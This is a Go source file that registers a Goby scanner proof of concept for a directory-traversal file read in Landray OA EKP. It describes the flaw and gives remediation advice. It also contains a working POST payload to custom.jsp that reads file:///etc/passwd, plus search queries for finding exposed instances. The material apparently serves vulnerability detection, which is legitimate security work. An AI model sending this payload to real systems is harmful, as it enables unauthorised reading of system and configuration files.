package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Landray OA EKP custom.jsp directory traversal vulnerability",
    "Description": "<p>Landray OA (EKP) is positioned as a management support platform and a good partner of ERP.</p><p>There is a directory traversal vulnerability in Lanling OA (EKP). An attacker may access some hidden files including configuration files, logs, source code, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can Easily obtain higher privileges.</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2021-08-31",
    "Author": "flyoung729@163.com",
    "FofaQuery": "((body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\")))",
    "GobyQuery": "((body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\")))",
    "Level": "3",
    "Impact": "<p>There is a directory traversal vulnerability in Lanling OA (EKP). An attacker may access some hidden files including configuration files, logs, source code, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can Easily obtain higher privileges.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.landray.com.cn/static-old/solution/ekp/index.html\">https://www.landray.com.cn/static-old/solution/ekp/index.html</a></p><p>1. If not necessary, prohibit the public network from accessing the device.</p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p>",
    "References": [
        "http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20custom.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html"
    ],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/ui/extend/varkind/custom.jsp",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA EKP custom.jsp 目录遍历漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌OA（EKP）定位为管理支撑平台，ERP的好搭档。</p><p>蓝凌OA（EKP）存在目录遍历漏洞，攻击者可能通过浏览⽬录结构，访问到某些隐秘⽂件包括配置⽂件、⽇志、源代码等，配合其它漏洞的综合利⽤，攻击者可以轻易的获取更⾼的权限。<br></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.landray.com.cn/static-old/solution/ekp/index.html\">https://www.landray.com.cn/static-old/solution/ekp/index.html</a></p><p>1、如⾮必要，禁⽌公⽹访问该设备。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。<br></p>",
            "Impact": "<p>蓝凌OA（EKP）存在目录遍历漏洞，攻击者可能通过浏览⽬录结构，访问到某些隐秘⽂件包括配置⽂件、⽇志、源代码等，配合其它漏洞的综合利⽤，攻击者可以轻易的获取更⾼的权限。<br><br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历",
                "信创"
            ]
        },
        "EN": {
            "Name": "Landray OA EKP custom.jsp directory traversal vulnerability",
            "Product": "Landray-OA",
            "Description": "<p>Landray OA (EKP) is positioned as a management support platform and a good partner of ERP.</p><p>There is a directory traversal vulnerability in Lanling OA (EKP). An attacker may access some hidden files including configuration files, logs, source code, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can Easily obtain higher privileges.</p>",
            "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.landray.com.cn/static-old/solution/ekp/index.html\">https://www.landray.com.cn/static-old/solution/ekp/index.html</a></p><p>1. If not necessary, prohibit the public network from accessing the device.</p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">There is a directory traversal vulnerability in Lanling OA (EKP). An attacker may access some hidden files including configuration files, logs, source code, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can Easily obtain higher privileges.</span><br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}